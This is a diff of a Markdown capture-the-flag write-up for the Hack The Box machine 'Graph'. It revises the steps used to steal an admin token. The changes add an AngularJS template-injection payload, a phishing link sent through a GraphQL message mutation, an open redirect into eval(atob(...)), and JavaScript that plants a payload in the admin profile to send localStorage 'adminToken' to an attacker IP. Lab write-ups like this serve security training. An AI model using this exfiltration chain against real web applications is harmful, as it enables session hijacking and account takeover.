@@ -423,6 +423,12 @@ But uploading requires an `adminToken`:
 {"result": "Invalid Token" }
 ```
 
+The dashboard is using AngularJS, and the profile page is vulnerable to SSTI! The firstname / lastname are reflected on each page and make perfect targets:
+
+```javascript
+{{$on.constructor('alert(1)')()}}
+```
+
 ## Getting admin credentials on the web portal
 
 ### Triggering the payload
@@ -430,7 +436,7 @@ But uploading requires an `adminToken`:
 Since we can message "Mark", there may be a way to gain his token. Let's poke Larry / Mark / James with a link to our server:
 
 ```json
-{"variables":{"to":"larry@graph.htb","text":"yo Larry!\n<img src=\"http://graph.htb/?redirect=http://10.10.16.4:9999/\">"},"query":"mutation ($to: String!, $text: String!) {\n  sendMessage(to: $to, text: $text) {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
+{"variables":{"to":"larry@graph.htb","text":"yo Larry!\n<img src=\"http://graph.htb/?redirect=http://10.10.16.4:8888/unlock.html\">"},"query":"mutation ($to: String!, $text: String!) {\n  sendMessage(to: $to, text: $text) {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
 ```
 
 Which they actually follow:
@@ -476,16 +482,16 @@ curl -i -s -k -X $'POST' \
     -H $'Content-Type: application/json' \
     --data-binary $'{\"variables\": {\"username\": \"'"$@"$'\"}, \"query\": \"query($username: String!){\\n tasks(username: $username){\\n Assignedto\\n username\\n text\\n taskstatus\\n type\\n}\\n}\"}' \
     $'http://internal-api.graph.htb/graphql' |
-    perl -ne $'m#"Assignedto":"([a-fA-F0-9]+)"# && print $1."\n"'
+perl -ne $'m#"Assignedto":"([a-fA-F0-9]+)"# && print $1."\n"'
 ```
 
-#### Messaging the admin
+#### Redirecting the admin user
 
-First, encode the successive payloads:
+First, encode the payloads and include it in the open redirect:
 
 ```shell
 PAYLOAD=$(echo -n "$@" | base64 -w 0)
-echo 'http://graph.htb/?redirect=javascript:alert(atob("'"${PAYLOAD}"'"));'
+echo 'http://graph.htb/?redirect=javascript:eval(atob("'"${PAYLOAD}"'"));'
 ```
 
 For some reason, the "=" padding needs to be removed for JS to decode the payload:
@@ -494,45 +500,68 @@ For some reason, the "=" padding needs to be removed for JS to decode the payloa
 http://graph.htb/?redirect=javascript:alert(atob("ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ"))
 ```
 
-It can be pasted in the messaging panel or directly sent:
+Then it can be pasted in the messaging panel.
 
-```shell
-bash payloads/message.sh $'mark@graph.htb' $'alert(1)' $'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyOWE5MzM0NzZlYWM4MDQzOTdjZjcwNiIsImVtYWlsIjoiYXBlaGV4QGdyYXBoLmh0YiIsImlhdCI6MTY1NDI5NzY4MywiZXhwIjoxNjU0Mzg0MDgzfQ.bBRCYXrb9A08CBOzyIWAdZZPZfw7ta0xvF1jyEoScEc'
+#### Updating the admin profile
+
+The redirect is used to take advantage of the SSTI on the user profile. The SSTI payload is planted after updating the admin profile with GraphQL:
+
+```json
+{"operationName":"update","variables":{"firstname":"{{$on.constructor('alert(1);')()}}","lastname":"null","id":"629b97099e22050421afde2d","newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}
 ```
 
-```shell
-TARGET=$1
-PAYLOAD=$(echo -n "$2" | base64 -w 0)
-COOKIE=$3
-URL=$(echo 'http://graph.htb/?redirect=javascript:eval(atob("'"${PAYLOAD}"'"));')
-curl -i -s -k -X $'POST' \
-    -H $'Host: internal-api.graph.htb' \
-    -H $'Content-Type: application/json' \
-    -b $'auth='"${COOKIE}" \
-    --data-binary $'{\"variables\":{\"to\":\"'"${TARGET}"'\",\"text\":\"'"${PAYLOAD}"'\"},\"query\":\"mutation ($to: String!, $text: String!) {\\n sendMessage(to: $to, text: $text) {\\n toUserName\\n fromUserName\\n text\\n to\\n from\\n __typename\\n }\\n}\"}' \
-    $'http://internal-api.graph.htb/graphql'
+Which can be queried via JS:
+
+```javascript
+fetch("http://internal-api.graph.htb/graphql", {
+    method: "POST",
+    headers: {"Content-Type": "application/json",},
+    credentials: "include",
+    body: JSON.stringify({"operationName":"update","variables":{"firstname":"{{$on.constructor('alert(1);')()}}","lastname":"null","id":"629b97099e22050421afde2d","newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n update(\n newusername: $newusername\n id: $id\n firstname: $firstname\n lastname: $lastname\n) {\n username\n email\n id\n firstname\n lastname\n __typename\n}\n}"}),
+})
 ```
 
 ### Reading the local storage
 
-The local storage is only accessible from "internal.graph.htb". So we need to inject JS into the user dashboard too. The profile is actually vulnerable:
+The previous SSTI payload can be improved to read the local storage:
 
 ```javascript
 {{$on.constructor('new Image.src="http://10.10.16.2:9999/?t="+window.localStorage.getItem("adminToken");')()}}
 ```
 
-Let's update the profile and add "username", "lastname" etc:
+This can be parametrized and encapsulated into a JS fetch request:
 
-```json
-{"operationName":"update","variables":{"firstname":"ape","lastname":"hex","id":"628b5134f4981e04372005d5","newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}
+```shell
+PAYLOAD='{{$on.constructor('"'"'new Image().src=\"http://'"${IP}"'/?token=\"+window.localStorage.getItem(\"adminToken\");'"'"')()}}'
+CODE='fetch("http://internal-api.graph.htb/graphql", {
+    method: "POST",
+    headers: {"Content-Type": "application/json",},
+    credentials: "include",
+    body: JSON.stringify({"operationName":"update","variables":{"firstname":"'"${PAYLOAD}"'","lastname":"null","id":"'"${ID}"'","newusername":"'"${USERNAME}"'"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n update(\n newusername: $newusername\n id: $id\n firstname: $firstname\n lastname: $lastname\n) {\n username\n email\n id\n firstname\n lastname\n __typename\n}\n}"}),
+})'
 ```
 
 ### Exfiltrate and admin token
 
-And fi-nal-ly exfiltrate an "adminToken"!..
+Now the exfiltration process is more straightforward:
 
-```html
-<script>fetch('http://graph.htb/?redirect=http://10.10.16.2:9999/'+JSON.stringify(localStorage));</script>
+```shell
+# create a new web user
+bash payloads/register.sh
+# get the user id of the admin that sends a message
+bash payloads/get_userid.sh Mark
+# craft a redirect XSS to inject the exfiltration payload in the admin profile
+bash payloads/ssti_profile.sh $'629babb17f2d0a05fc3730f1' $'Mark' $'10.10.16.2:9999' | uglifyjs > payload
+# generate the redirection URL
+bash payloads/redirect.sh $(cat payload)
+# finally, send the resulting URL to the admin by message
+# and then redirect to the logout to actually load the code from the server
+```
+
+And fi-nal-ly exfiltrate an "adminToken"! O-M-G...
+
+```
+
 ```
 
 ## Compromise an OS used
